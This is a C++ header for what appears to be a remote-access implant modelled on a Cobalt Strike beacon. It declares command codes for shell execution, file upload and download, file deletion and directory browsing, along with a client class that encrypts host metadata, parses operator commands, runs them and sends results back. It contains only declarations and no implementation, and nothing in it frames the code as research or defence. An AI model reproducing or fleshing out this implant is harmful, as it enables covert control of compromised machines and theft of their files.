#pragma once
#include <cstdint>
#include <random>
#include <intrin.h>
#include <memory>
#include <thread>
#include <sstream>
#include <direct.h>
#include "MetaInfo.h"



namespace Beacon {
	constexpr int HmacHashLen = 16;
	enum CMD {
		TYPE_SLEEP = 4,
		TYPE_DEL_FILE = 56,
		TYPE_EXECUTE = 12,
		TYPE_SHELL = 78,
		TYPE_UPLOAD_START = 10,
		TYPE_UPLOAD_LOOP = 67,
		TYPE_DOWNLOAD = 11,
		TYPE_EXIT = 3,
		TYPE_CD = 5,
		TYPE_PWD = 39,
		TYPE_FILE_BROWSE = 53,
	};
	class WhatBoys
	{
		public:
			WhatBoys();
			bool	connect();
			
		private:
			std::string s_meta_info_;
			std::string s_meta_cipher_;
			std::uint32_t	wait_time_;
			std::uint32_t	packet_counter_;
			std::wstring	b_id_;
		private:
			std::uint32_t	get_boy_id();
			std::string 	make_meta_info();
			std::uint8_t	get_metadata_flag();
			std::uint32_t	get_magic_head();
			std::string		make_result_packet(int type,std::string &content);
			std::string		b_exec(std::string& cmd);
			std::pair<int, std::string>				parse_command(unsigned char* buf);
			virtual std::pair<int, std::string>		command_default_callback(int cmd_type, std::string& cmd_buf);
			bool			push_result(std::string &result);

	};

}

